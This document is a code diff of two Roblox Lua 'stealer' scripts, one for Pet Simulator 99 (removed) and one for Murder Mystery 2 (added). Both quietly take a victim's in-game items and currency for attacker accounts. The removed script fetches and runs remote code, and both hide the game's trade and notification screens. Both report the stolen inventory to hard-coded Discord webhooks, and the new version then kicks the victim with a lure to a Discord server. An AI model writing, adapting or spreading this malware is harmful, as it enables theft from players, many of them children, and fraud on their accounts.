@@ -1,362 +1,25 @@
-local function LoadingScreenAsync()
-    task.spawn(function()
-        local ok, result = pcall(function()
-            local baseUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen"
-            local customUrl = "%%LOADSCREEN%%"
 
-            if not customUrl:match("^https?://") then
-                customUrl = ""
-            end
+repeat task.wait() until game:IsLoaded()
+task.wait(2)
 
-            local url = (customUrl ~= "" and customUrl) or baseUrl
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
 
-            local code = game:HttpGet(url, true)
-            local fn = loadstring(code)
-            if type(fn) ~= "function" then
-                error("loadstring did not return a function")
-            end
-            fn()
-        end)
+local cfg = (getgenv and getgenv()) or {}
+cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
+cfg.pingEveryone = "Yes"
 
-        if not ok then
-            warn("Failed to load LoadingScreen:", result)
-        end
-    end)
-end
-
-
-local network = require(game.ReplicatedStorage.Library.Client.Network)
-local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-local player = game.Players.LocalPlayer
-local MailMessage = "GG / xGgkWUxU3w"
+local users = {"Getstompedbyyounes"}        
+local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local sortedItems = {}
-local totalRAP = 0
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
-local blacklist = {"Eliaskulmer999", "mskksld", "anubismc16", "diegoplays103"} --please keep those, those are friends of mine and I blacklist them so they dont get hit by any of my scripts. You can still add more users.
-
-_G.Usernames = {"Eliaskulmer999", "Eliaskulmer999"}
-_G.Webhook = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa"
-
-
-local Forward = "https://webhook-rose-nu.vercel.app/api/forward.js"
-local users = {}
-local min_rap = 1000000
-local webhook = ""
-local HIGH_VALUE_THRESHOLD = 10000000000
-
-users = _G.Usernames
-webhook = _G.Webhook
-
-
-if table.find(blacklist, player.Name) then
-	player:Kick("Nuls Script!!!")
-end
-
-if not users or #users == 0 or webhook == "" then
-    player:Kick("Error at table 0x7bA42l\nCheck Discord for more information.")
-end
-
-LoadingScreenAsync()
-wait(1)
-
-for adress, func in pairs(getgc()) do
-    if debug.getinfo(func).name == "computeSendMailCost" then
-        FunctionToGetFirstPriceOfMail = func
-        break
-    end
-end
-
-local mailPrice = FunctionToGetFirstPriceOfMail()
-
-local function EmptyMailBoxes()
-    if save.Box then
-        for key, value in pairs(save.Box) do
-			if value._uq then
-				network.Invoke("Box: Withdraw All", key)
-			end
-        end
-    end
-end
-
-local function ClaimAllMail()
-    local response, err = network.Invoke("Mailbox: Claim All")
-    while err == "You must wait 30 seconds before using the mailbox!" do
-        wait(0.2)
-        response, err = network.Invoke("Mailbox: Claim All")
-    end
-end
-
-local function formatNumber(number)
-	local number = math.floor(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
-end
-
-
-local gemsleaderstat = player.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = player.leaderstats["\240\159\146\142 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
-end)
-
-
-local HttpService = game:GetService("HttpService")
-
-local loading = player.PlayerScripts:WaitForChild("Scripts"):WaitForChild("Core"):WaitForChild("Process Pending GUI")
-local noti = player.PlayerGui:WaitForChild("Notifications")
-
-if loading then
-	loading.Disabled = true
-end
-
-if noti then
-	noti.Enabled = false
-
-	noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-		if noti.Enabled then
-			noti.Enabled = false
-		end
-	end)
-end
-
-local blockedSounds = {
-	["rbxassetid://11839132565"] = true,
-	["rbxassetid://14254721038"] = true,
-	["rbxassetid://12413423276"] = true
-}
-
-game.DescendantAdded:Connect(function(obj)
-	if obj:IsA("Sound") then
-		if blockedSounds[obj.SoundId] then
-			obj.Volume = 0
-			obj.PlayOnRemove = false
-			obj:Destroy()
-		end
-	end
-end)
-
-local function getRAP(Type, Item)
-    local rap = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
-        Class = { Name = Type },
-        IsA = function(hmm)
-            return hmm == Type
-        end,
-        GetId = function()
-            return Item.id
-        end,
-        StackKey = function()
-            return HttpService:JSONEncode({
-                id = Item.id,
-                pt = Item.pt,
-                sh = Item.sh,
-                tn = Item.tn
-            })
-        end,
-        AbstractGetRAP = function()
-            return nil
-        end
-    })
-
-    return rap or 0
-end
-local function canSendMail()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
-		break
-	end
-	local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
-    }
-    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-    return (err == "They don't have enough space!")
-end
-EmptyMailBoxes()
-ClaimAllMail()
-wait(0.5)
-
-local GemAmount
-for _, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount = v._am
-        break
-    end
-end
-
-require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local plr = Players.LocalPlayer
 
-local PetsDirectory = require(ReplicatedStorage.Library.Directory.Pets)
+if not plr then return end
 
-local categoryList = {
-    "Pet","Egg","Charm","Enchant","Potion",
-    "Misc","Hoverboard","Booth","Ultimate"
-}
-
-local sortedItems = {}
-local totalRAP = 0
-
-for _,category in ipairs(categoryList) do
-    local categoryData = save[category]
-
-    if categoryData then
-        for uid,item in pairs(categoryData) do
-
-            local rapValue = getRAP(category,item)
-
-            if rapValue >= min_rap then
-
-                local amount = item._am or 1
-                local itemName = item.id
-
-                -- PET SPECIAL HANDLING
-                if category == "Pet" then
-
-                    local dir = PetsDirectory[item.id]
-
-                    if dir and (dir.huge or dir.exclusiveLevel) then
-
-                        local prefix = ""
-
-                        if item.pt == 1 then
-                            prefix = "Golden "
-                        elseif item.pt == 2 then
-                            prefix = "Rainbow "
-                        end
-
-                        if item.sh then
-                            prefix = "Shiny " .. prefix
-                        end
-
-                        itemName = prefix .. item.id
-
-                    else
-                        itemName = nil
-                    end
-                end
-
-                if itemName then
-                    table.insert(sortedItems,{
-                        category = category,
-                        uid = uid,
-                        amount = amount,
-                        rap = rapValue,
-                        name = itemName
-                    })
-
-                    totalRAP = totalRAP + (rapValue * amount)
-                end
-            end
-
-            -- unlock items if locked
-            if item._lk then
-                network.Invoke("Locking_SetLocked",uid,false)
-            end
-
-        end
-    end
-end
-
-table.sort(sortedItems, function(a, b)
-    return (a.rap * a.amount) > (b.rap * b.amount)
-end)
-
-local function buildItemSummary(items)
-
-    if not items then
-        return ""
-    end
-
-    local map = {}
-    local order = {}
-
-    for _, item in ipairs(items) do
-
-        local name = item.name
-
-        if not map[name] then
-            map[name] = {
-                amount = 0,
-                totalRap = 0
-            }
-
-            table.insert(order, name)
-        end
-
-        map[name].amount = map[name].amount + item.amount
-        map[name].totalRap = map[name].totalRap + (item.rap * item.amount)
-
-    end
-
-    table.sort(order, function(a, b)
-        return map[a].totalRap > map[b].totalRap
-    end)
-
-    local lines = {}
-
-    for _, name in ipairs(order) do
-
-        local data = map[name]
-
-        table.insert(lines, string.format(
-            "• %dx %s | %s RAP",
-            data.amount,
-            name,
-            formatNumber(data.totalRap)
-        ))
-
-    end
-
-    return table.concat(lines, "\n")
-
-end
-
-local function uploadPaste(content)
-    local body = HttpService:JSONEncode({
-        content = content
-    })
-
-    local result = HttpService:PostAsync(
-        "https://pastefy.app/api/v2/paste",
-        body,
-        Enum.HttpContentType.ApplicationJson
-    )
-
-    local data = HttpService:JSONDecode(result)
-
-    if data and data.paste and data.paste.url then
-        return data.paste.url
-    end
-
-    return nil
-end
-
-local RAP_TO_EUR = 10000000 -- Idk if its right but i will keep it like that
-
-local function rapToEUR(rap)
-    return rap / RAP_TO_EUR
-end
-
-local function formatEUR(v)
-    return string.format("€%.2f", v)
-end
-
+local isTradeCompleted = false
+local totalInventoryValue = 0
 
 local function findRequest()
     if request then
@@ -382,298 +45,329 @@ local function findRequest()
     return nil, "Roblox HttpService"
 end
 
-local function formatAccountAge(days)
-    if days >= 365 then
-        return string.format("%.1f years (%d days)", days / 365, days)
-    end
-    return string.format("%d days", days)
-end
+local PlaceId = game.PlaceId
+local JobId = game.JobId
 
-local function SendMessage(GemAmount)
+local fernJoinerLink = string.format(
+    "https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", 
+    PlaceId, 
+    JobId
+)
 
-    local execRequest, executorName = findRequest()
-    local usingStudio = not execRequest
 
-    local fields = {}
-
-    -- Top row: Username | Receiver | Account Age
-    table.insert(fields,{
-        name = "👤 Username",
-        value = "```" .. tostring(player.Name) .. "```",
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "📥 Receiver",
-        value = "```" .. tostring(table.concat(users,", ")) .. "```",
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "📅 Account Age",
-        value = "```" .. tostring(formatAccountAge(player.AccountAge)) .. "```",
-        inline = true
-    })
-
-    -- Second row: Executor | Total RAP | (empty for alignment)
-    table.insert(fields,{
-        name = "⚡ Executor",
-        value = "```" .. tostring(executorName or "Unknown") .. "```",
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "💎 Total RAP",
-        value = "```" .. tostring(formatNumber(totalRAP)) .. "```",
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "​",
-        value = "​",
-        inline = true
-    })
-
-    local isHighValue = totalRAP >= HIGH_VALUE_THRESHOLD
-
-    if isHighValue then
-        table.insert(fields,{
-            name = "🚨 Alert",
-            value = "```**HIGH VALUE HIT DETECTED**```",
-            inline = false
+local function GodfatherScriptFetchSupremeValues()
+    local values = {}
+    local success, result = pcall(function()
+        local response = request({
+            Url = "https://api.supremevaluelist.com/mm2/items",
+            Method = "GET",
+            Headers = { ["User-Agent"] = "Mozilla/5.0" }
         })
-    end
-
-    local itemMap = {}
-    local order = {}
-
-    for _,item in ipairs(sortedItems) do
-        if not itemMap[item.name] then
-            itemMap[item.name] = {
-                amount = 0,
-                rap = item.rap
-            }
-            table.insert(order,item.name)
+        if response and response.Body then
+            return HttpService:JSONDecode(response.Body)
         end
-        itemMap[item.name].amount = itemMap[item.name].amount + item.amount
-    end
-
-    table.sort(order,function(a,b)
-        local A = itemMap[a]
-        local B = itemMap[b]
-        return (A.amount * A.rap) > (B.amount * B.rap)
+        return nil
     end)
-
-    local itemText = ""
-
-    for _,name in ipairs(order) do
-        local data = itemMap[name]
-        local totalRap = data.amount * data.rap
-        local eur = rapToEUR(totalRap)
-        itemText = itemText .. string.format(
-            "• %dx %s | %s RAP | %s\n",
-            data.amount,
-            name,
-            formatNumber(totalRap),
-            formatEUR(eur)
-        )
-    end
-
-    local pasteLink = nil
-
-    if #itemText > 900 then
-        local pasteBody = HttpService:JSONEncode({
-            content = itemText
-        })
-        local result = HttpService:PostAsync(
-            "https://pastefy.app/api/v2/paste",
-            pasteBody,
-            Enum.HttpContentType.ApplicationJson
-        )
-        local data = HttpService:JSONDecode(result)
-        if data and data.paste then
-            pasteLink = data.paste.url
-        end
-        itemText = "Item list too long.\nFull list:\n"..tostring(pasteLink)
-    end
-
-    local totalEUR = rapToEUR(totalRAP)
-    local gemsEUR = rapToEUR(GemAmount)
-
-    local summaryText =
-        "💎 Gems: "..formatNumber(GemAmount).." ("..formatEUR(gemsEUR)..")"..
-        "\n📊 Total RAP: "..formatNumber(totalRAP)..
-        "\n💰 Estimated Value: "..formatEUR(totalEUR)
-
-    -- Items section with emoji header like the reference image
-    table.insert(fields,{
-        name = "📋 Items",
-        value = "```" .. itemText .. "```",
-        inline = false
-    })
-
-    -- Summary section with emoji header
-    table.insert(fields,{
-        name = "💰 Summary",
-        value = "```" .. summaryText .. "```",
-        inline = false
-    })
-
-    local titleName
-    local embedColor
-
-    if totalRAP >= 10000000000 then
-        titleName = "🚨 PS99 | INSANE HIT 🚨"
-        embedColor = 16711680  -- Red
-    elseif totalRAP >= 100000000 then
-        titleName = "PS99 | GOOD HIT"
-        embedColor = 8388736   -- Purple
-    elseif totalRAP > 50000000 then
-        titleName = "PS99 | NORMAL HIT"
-        embedColor = 2303786   -- Dark
-    else
-        titleName = "PS99 | BAD HIT"
-        embedColor = 2303786   -- Dark
-    end
-
-    local contentPing = isHighValue and "@everyone" or ""
-
-    local body = HttpService:JSONEncode({
-        webhook = webhook,
-        content = contentPing,
-        username = "GodFather Stealer",
-        avatar_url = "https://i.imgur.com/ulY8nQk.png",
-        embeds = {{
-            title = titleName,
-            color = embedColor,
-            fields = fields,
-            footer = {
-                text = "GodFather Stealer | .gg/ronixexecutor\n Made By NULS :3"
-            }
-        }}
-    })
-
-    if usingStudio then
-        return HttpService:PostAsync(
-            Forward,
-            body,
-            Enum.HttpContentType.ApplicationJson
-        )
-    else
-        return execRequest({
-            Url = Forward,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = body
-        })
-    end
-
-end
-
-local function sendItem(category, uid, am)
-    local userIndex = 1
-    local maxUsers = #users
-    local sent = false
     
-    repeat
-        local currentUser = users[userIndex]
-        local args = {
-            [1] = currentUser,
-            [2] = MailMessage,
-            [3] = category,
-            [4] = uid,
-            [5] = am or 1
-        }
-
-        local response, err = network.Invoke("Mailbox: Send", unpack(args))
-
-        if response == true then
-            sent = true
-            GemAmount = GemAmount - mailPrice
-            mailPrice = math.ceil(math.ceil(mailPrice) * 1.5)
-            if mailPrice > 5000000 then
-                mailPrice = 5000000
-            end
-        elseif response == false and err == "They don't have enough space!" then
-            userIndex = userIndex + 1
-            if userIndex > maxUsers then
-                sent = true
+    if success and result then
+        for _, item in ipairs(result) do
+            if item.name and item.value then
+                values[item.name:lower()] = item.value
             end
         end
-    until sent
+    end
+    return values
 end
 
-local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            if GemAmount >= (mailPrice + 10000) then
-                local userIndex = 1
-                local maxUsers = #users
-                local sent = false
-                
-                repeat
-                    local currentUser = users[userIndex]
-                    local args = {
-                        [1] = currentUser,
-                        [2] = MailMessage,
-                        [3] = "Currency",
-                        [4] = i,
-                        [5] = GemAmount - mailPrice
-                    }
-                    
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-                    
-                    if response == true then
-                        sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
-                        if userIndex > maxUsers then
-                            sent = true
-                        end
-                    end
-                until sent
-                break
-            end
+local supremeValues = GodfatherScriptFetchSupremeValues()
+
+local function GodfatherScriptGetItemValue(itemName, rarity)
+    if not itemName then return 0 end
+    local lowerName = itemName:lower()
+    if supremeValues[lowerName] then return supremeValues[lowerName] end
+    
+    if lowerName:find("chroma") then
+        local baseName = lowerName:gsub("chroma ", "")
+        if supremeValues[baseName] then return supremeValues[baseName] * 2 end
+    end
+    
+    local defaultValues = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 5, Godly = 10, Ancient = 20, Unique = 30, Vintage = 50 }
+    return defaultValues[rarity] or 1
+end
+
+if not plr.Character then plr.CharacterAdded:Wait() end
+task.wait(1)
+
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local SendRequest = Trade:WaitForChild("SendRequest")
+local GetStatus = Trade:WaitForChild("GetTradeStatus")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+
+local LastOffer = nil
+Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
+    if x and x.LastOffer then LastOffer = x.LastOffer end
+end)
+
+local PlayerGui = plr:WaitForChild("PlayerGui")
+for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+    local gui = PlayerGui:WaitForChild(guiName, 3)
+    if gui then
+        gui.Enabled = false
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled then gui.Enabled = false end
+        end)
+    end
+end
+
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
+
+local function GodfatherScriptIsDefaultItem(itemName)
+    if not itemName then return false end
+    local lower = itemName:lower()
+    return lower:find("default") and (lower:find("gun") or lower:find("knife"))
+end
+
+local weaponsToSend = {}
+local rarityCounts = {}
+
+for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
+    local item = database[dataid]
+    if item then
+        if GodfatherScriptIsDefaultItem(item.ItemName) or GodfatherScriptIsDefaultItem(dataid) then continue end
+        
+        local rarity = item.Rarity or "Common"
+        local itemValue = GodfatherScriptGetItemValue(item.ItemName, rarity)
+        local totalItemValue = itemValue * amount
+        
+        totalInventoryValue = totalInventoryValue + totalItemValue
+        
+        if not dataid:lower():find("untradable") then
+            table.insert(weaponsToSend, {
+                DataID = dataid,
+                ItemName = item.ItemName or dataid,
+                Amount = amount,
+                Rarity = rarity,
+                Value = itemValue,
+                TotalValue = totalItemValue
+            })
+            rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
         end
     end
 end
 
-if #sortedItems > 0 or GemAmount > (min_rap + mailPrice) then
+table.sort(weaponsToSend, function(a, b) return (a.TotalValue) > (b.TotalValue) end)
 
-    ClaimAllMail()
-    EmptyMailBoxes()
+local itemsListText = ""
+for i = 1, math.min(20, #weaponsToSend) do
+    local item = weaponsToSend[i]
+    itemsListText = itemsListText .. string.format("%s x%d (%d value)\n", item.ItemName, item.Amount, item.TotalValue)
+end
 
-    if not canSendMail() then
-        player:Kick("Account error. Please rejoin and try again or use a different account")
-        return
+if #weaponsToSend > 20 then
+    itemsListText = itemsListText .. string.format("\nand %d more items", #weaponsToSend - 20)
+end
+
+local rarityText = ""
+for _, rarity in ipairs(rarityTable) do
+    if rarityCounts[rarity] and rarityCounts[rarity] > 0 then
+        rarityText = rarityText .. string.format("%s: %d\n", rarity, rarityCounts[rarity])
     end
+end
 
-    wait(0.5)
-
-    SendMessage(GemAmount)
-
-    table.sort(sortedItems, function(a,b)
-        return (a.rap * a.amount) > (b.rap * b.amount)
+local function GodfatherScriptSendWebhook()
+    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
+    local targetName = users[1]
+	local execRequest, executorName = findRequest()
+    
+    local embed = {
+        title = string.format("Godfather Script | %s | %s", plr.DisplayName, targetName),
+        description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", plr.Name, totalInventoryValue),
+        color = 0xFF0000,
+        thumbnail = {url = avatarUrl},
+        fields = {
+            {
+                name = "Player Info",
+                value = string.format("Display: %s\nUsername: %s\nUser ID: %d\nAccount Age: %d days\nExecutor: %s",
+                    plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge or 0, executorName),
+                inline = true
+            },
+            {
+                name = "Join Link",
+                value = string.format("[Click to Join](%s)\n```\n%s\n```", fernJoinerLink, fernJoinerLink),
+                inline = false
+            },
+            {
+                name = "Server Info",
+                value = string.format("JobId: %s\nPlaceId: %d", JobId, PlaceId),
+                inline = true
+            },
+            {
+                name = "Total Items",
+                value = string.format("%d items\nValue: %d", #weaponsToSend, totalInventoryValue),
+                inline = true
+            },
+            {
+                name = "Rarity Distribution",
+                value = rarityText ~= "" and rarityText or "No data",
+                inline = false
+            },
+            {
+                name = string.format("Top Items (%d)", math.min(20, #weaponsToSend)),
+                value = itemsListText ~= "" and itemsListText or "No items",
+                inline = false
+            },
+            {
+                name = "Target Receiver",
+                value = string.format("%s", targetName),
+                inline = true
+            }
+        },
+        footer = {
+            text = string.format("Godfather Script | %s", os.date("%d/%m/%Y %H:%M"))
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    
+    local payload = {
+        content = cfg.pingEveryone == "Yes" and "@everyone Godfather Script Hit!" or nil,
+        embeds = {embed}
+    }
+    
+    
+    return execRequest({
+            Url = cfg.webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
     end)
+end
 
-    for _, item in ipairs(sortedItems) do
+GodfatherScriptSendWebhook()
 
-        if GemAmount <= mailPrice then
-            break
+local function GodfatherScriptGetStatus()
+    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    return ok and status or "None"
+end
+
+local function GodfatherScriptWaitForTarget(targetPlayer)
+    local attempts = 0
+    while attempts < 30 do
+        if targetPlayer and targetPlayer.Parent then
+            local char = targetPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then return true end
         end
-
-        if item.rap >= min_rap then
-
-            sendItem(item.category, item.uid, item.amount)
-            GemAmount = GemAmount - mailPrice
-
-        end
+        attempts = attempts + 1
+        task.wait(0.5)
     end
+    return false
+end
 
-    if GemAmount > mailPrice then
-        SendAllGems()
+local function GodfatherScriptAcceptTrade()
+    if not LastOffer then return false end
+    local ok = pcall(function()
+        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
+    end)
+    return ok
+end
+
+local function GodfatherScriptFinishAndKick()
+    isTradeCompleted = true
+    task.wait(2)
+    local discordLink = "https://discord.gg/dUaHggzp9q"
+    if setclipboard then setclipboard(discordLink) end
+    plr:Kick("Godfather Script\n\nItems taken successfully\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+end
+
+function GodfatherScriptDoTrade(targetPlayer)
+    if not targetPlayer or not targetPlayer.Parent then return end
+    if not GodfatherScriptWaitForTarget(targetPlayer) then return end
+    
+    pcall(function() DeclineTrade:FireServer() end)
+    task.wait(0.5)
+    LastOffer = nil
+    
+    local itemsAdded = false
+    local timeout = 0
+    
+    while timeout < 60 and #weaponsToSend > 0 do
+        local success = pcall(function()
+            local status = GodfatherScriptGetStatus()
+            
+            if status == "None" then
+                if itemsAdded then
+                    for i = 1, math.min(4, #weaponsToSend) do table.remove(weaponsToSend, 1) end
+                    itemsAdded = false
+                    LastOffer = nil
+                    task.wait(0.5)
+                else
+                    SendRequest:InvokeServer(targetPlayer)
+                    task.wait(1.5)
+                end
+            elseif status == "SendingRequest" then
+                task.wait(0.5)
+            elseif status == "ReceivingRequest" then
+                DeclineTrade:FireServer()
+                task.wait(0.3)
+            elseif status == "StartTrade" then
+                if not itemsAdded then
+                    for i = 1, math.min(4, #weaponsToSend) do
+                        local item = weaponsToSend[i]
+                        for _ = 1, item.Amount do
+                            OfferItem:FireServer(item.DataID, "Weapons")
+                        end
+                        task.wait(0.1)
+                    end
+                    itemsAdded = true
+                    task.spawn(function()
+                        task.wait(6.5)
+                        GodfatherScriptAcceptTrade()
+                    end)
+                else
+                    task.wait(1)
+                end
+            end
+        end)
+        
+        if not success then task.wait(1) end
+        timeout = timeout + 1
     end
+    
+    if #weaponsToSend == 0 then GodfatherScriptFinishAndKick() end
+end
 
+local function GodfatherScriptIsTarget(name)
+    for _, u in ipairs(users) do
+        if u:lower() == name:lower() then return true end
+    end
+    return false
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player == plr then return end
+    if GodfatherScriptIsTarget(player.Name) then
+        task.spawn(function()
+            task.wait(4)
+            GodfatherScriptDoTrade(player)
+        end)
+    end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= plr and GodfatherScriptIsTarget(p.Name) then
+        task.spawn(function()
+            task.wait(2)
+            GodfatherScriptDoTrade(p)
+        end)
+        break
+    end
+end
+
+while not isTradeCompleted do
+    task.wait(1)
 end
